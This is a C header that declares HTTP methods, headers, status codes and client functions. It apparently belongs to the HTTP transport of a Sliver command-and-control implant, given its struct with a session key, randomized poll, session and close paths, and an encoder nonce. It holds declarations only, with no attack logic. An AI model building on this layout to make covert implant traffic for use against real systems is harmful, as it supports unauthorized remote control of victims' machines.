#pragma once

typedef enum _HttpMethod {
	GET,
	POST,
	PUT,
	DEL,
	HEAD,
	OPTIONS,
	TRCE,
	CONNECT,
	MERGE,
	PATCH,
} HttpMethod;

typedef enum _ContentTy
{
	ApplicationAtomXml,
	ApplicationHttp,
	ApplicationJavascript,
	ApplicationJson,
	ApplicationXjson,
	ApplicationOctetstream,
	ApplicationXWwwFormUrlencoded,
	MultipartFormData,
	Boundary,
	FormData,
	ApplicationXjavascript,
	ApplicationXml,
	MessageHttp,
	Text,
	TextJavascript,
	TextJson,
	TextPlain,
	TextPlainUtf16,
	TextPlainUtf16le,
	TextPlainUtf8,
	TextXjavascript,
	TextXjson,
} ContentTy;

typedef enum _HttpHeader
{
	Accept,
	AcceptCharset,
	AcceptEncoding,
	AcceptLanguage,
	AcceptRanges,
	AccessControlAllowOrigin,
	Age,
	Allow,
	Authorization,
	CacheControl,
	Connection,
	ContentEncoding,
	ContentLanguage,
	ContentLength,
	ContentLocation,
	ContentMd5,
	ContentRange,
	ContentType,
	ContentDisposition,
	Date,
	Etag,
	Expect,
	Expires,
	From,
	Host,
	IfMatch,
	IfModifiedSince,
	IfNoneMatch,
	IfRange,
	IfUnmodifiedSince,
	LastModified,
	Location,
	MaxForwards,
	Pragma,
	ProxyAuthenticate,
	ProxyAuthorization,
	Range,
	Referer,
	RetryAfter,
	Server,
	Te,
	Trailer,
	TransferEncoding,
	Upgrade,
	UserAgent,
	Vary,
	Via,
	Warning,
	WwwAuthenticate,
	UpgradeInsecureRequests,
	HeaderEnumEnd
} HttpHeader;

typedef enum _StatusCode {
	Continue = 100,
	SwitchingProtocols = 101,
	OK = 200,
	Created = 201,
	Accepted = 202,
	NonAuthInfo = 203,
	NoContent = 204,
	ResetContent = 205,
	PartialContent = 206,
	MultiStatus = 207,
	AlreadyReported = 208,
	IMUsed = 226,
	MultipleChoices = 300,
	MovedPermanently = 301,
	Found = 302,
	SeeOther = 303,
	NotModified = 304,
	UseProxy = 305,
	TemporaryRedirect = 307,
	PermanentRedirect = 308,
	BadRequest = 400,
	Unauthorized = 401,
	PaymentRequired = 402,
	Forbidden = 403,
	NotFound = 404,
	MethodNotAllowed = 405,
	NotAcceptable = 406,
	ProxyAuthRequired = 407,
	RequestTimeout = 408,
	Conflict = 409,
	Gone = 410,
	LengthRequired = 411,
	PreconditionFailed = 412,
	RequestEntityTooLarge = 413,
	RequestUriTooLarge = 414,
	UnsupportedMediaType = 415,
	RangeNotSatisfiable = 416,
	ExpectationFailed = 417,
	MisdirectedRequest = 421,
	UnprocessableEntity = 422,
	Locked = 423,
	FailedDependency = 424,
	UpgradeRequired = 426,
	PreconditionRequired = 428,
	TooManyRequests = 429,
	RequestHeaderFieldsTooLarge = 431,
	UnavailableForLegalReasons = 451,
	InternalError = 500,
	NotImplemented = 501,
	BadGateway = 502,
	ServiceUnavailable = 503,
	GatewayTimeout = 504,
	HttpVersionNotSupported = 505,
	VariantAlsoNegotiates = 506,
	InsufficientStorage = 507,
	LoopDetected = 508,
	NotExtended = 510,
	NetworkAuthenticationRequired = 511,
} StatusCode;

typedef struct _HTTP_REQUEST {
	HttpMethod Method;
	LPSTR ContentTy;
	LPSTR lpData;
	DWORD cbData;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	LPSTR Headers[HeaderEnumEnd];
} HTTP_REQUEST, *PHTTP_REQUEST;

typedef struct _HTTP_SESSION {
	HINTERNET hSession;
	BOOL ProxyAutoConfig;
	LPSTR lpProxyAutoConfigUrl;
} HTTP_SESSION, *PHTTP_SESSION;

typedef struct _HTTP_CONFIG {
	PWEB_PROXY pProxyConfig;
	LPSTR lpUserAgent;
	BOOL DisableUpgradeHeader;
	LPSTR AdditionalHeaders[HeaderEnumEnd];
} HTTP_CONFIG, *PHTTP_CONFIG;

typedef struct _SLIVER_HTTP_CLIENT {
	HTTP_CONFIG HttpConfig;
	PBYTE pSessionKey;
	DWORD cbSessionKey;
	LPSTR lpHostName;
	DWORD dwPort;
	BOOL UseStandardPort;
	LPSTR PollPaths[66];
	LPSTR PollFiles[109];
	LPSTR SessionPaths[99];
	LPSTR SessionFiles[100];
	LPSTR ClosePaths[57];
	LPSTR CloseFiles[103];
	LPSTR lpPathPrefix;
	DWORD dwMinNumOfSegments;
	DWORD dwMaxNumOfSegments;
	UINT64 uEncoderNonce;
} SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;

typedef enum {
	PollType,
	SessionType,
	CloseType
} SegmentType;

typedef struct _HTTP_CLIENT {
	PURI pUri;
	PHTTP_SESSION pHttpSession;
	PWEB_PROXY pProxyConfig;
	HINTERNET hConnection;
} HTTP_CLIENT, *PHTTP_CLIENT;

typedef struct _HTTP_RESP {
	PBYTE pRespData;
	DWORD cbResp;
	DWORD dwStatusCode;
	HINTERNET hRequest;
} HTTP_RESP, *PHTTP_RESP;

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ PWEB_PROXY pProxyConfig
);

PWINHTTP_PROXY_INFO GetProxyForUrl
(
	_In_ PHTTP_SESSION pHttpSession,
	_In_ PURI pUri
);

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT This,
	_In_ PHTTP_REQUEST pRequest,
	_In_opt_ LPSTR lpContentType,
	_In_opt_ LPSTR lpData,
	_In_opt_ DWORD cbData
);

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
);

BOOL ReceiveData
(
	_In_ HINTERNET hRequest,
	_Out_ PBYTE* pData,
	_Out_ PDWORD pdwDataSize
);

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
);

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
);

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
);

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
);

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG This,
	_In_ HttpMethod Method,
	_In_ LPSTR lpUrl,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
);

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
);